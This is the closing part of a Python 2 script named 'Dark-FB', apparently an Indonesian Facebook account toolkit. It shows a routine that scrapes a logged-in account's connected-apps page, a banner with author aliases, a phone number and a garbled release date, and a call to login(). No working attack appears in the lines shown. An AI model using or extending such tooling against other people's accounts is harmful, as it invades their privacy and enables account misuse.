        bs = sup(apa.get('https://mbasic.facebook.com/settings/apps/tabbed/').text, features='html.parser')
        for z in bs.find_all('h3'):
            x = z.find('div')
            if 'None' in str(x):
                continue
            else:
                print tutup + '[' + lime + '~' + tutup + ']', x.text

    else:
        print tutup + '[' + merah + '!' + tutup + '] Login gagal'
    print tutup + '[' + lime + '+' + tutup + '] Done' + tutup
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


def infotools():
    os.system('clear')
    print ("""     __  __      ____                  _
    |  \/  |_ __| __ )  __ _  ___ ___ | |_                     | |\/| | __|  _ \ / _` |/ __/ _ \| __|                     | |  | | | _| |_) | (_| | (_| (_) | |_                     |_|  |_|_|(_)____/ \__,_|\___\___/ \__|                ---------------------------------------------                             [ TOOLS INFO ]
Author  : Mr.Bacot
Support : Mr.Lonte
Name    : PePek Anjink
Version : v1.9
---------------------------------------------""" )
    print merah + '             ||    || ' + tutup + u' \x1b[7m Author: Mr.Bacot\x1b[0m' + tutup
    print ''
    print kuning + '                 Coded' + tutup + ' : ' + at
    print kuning + '               Support' + tutup + ' : ./Mr.Lonte'
    print kuning + '                Source' + tutup + ' : ' + lime + 'https://github.com/Mr.Bacot'
    print kuning + '            Name Tools' + tutup + ' : Dark-FB'
    print kuning + '               Version' + tutup + ' : 1.9'
    print kuning + '              Language' + tutup + ' : English/Indonesian'
    print kuning + '          Date Release' + tutup + ' : 25/09/20019'
    print kuning + '               Contact' + tutup + ' : +622288231535'
    print kuning + '        Status License' + tutup + ' : OK'
    print '\n\n\n'
    print putih + '        Copyright \xc2\xa9 2019 IDNCoder. All Rights Reserved' + tutup
    print '\n\n\n\n'
    raw_input(tutup + '\nEnter returns to the menu ...')
    menu()


if __name__ == '__main__':
    login()
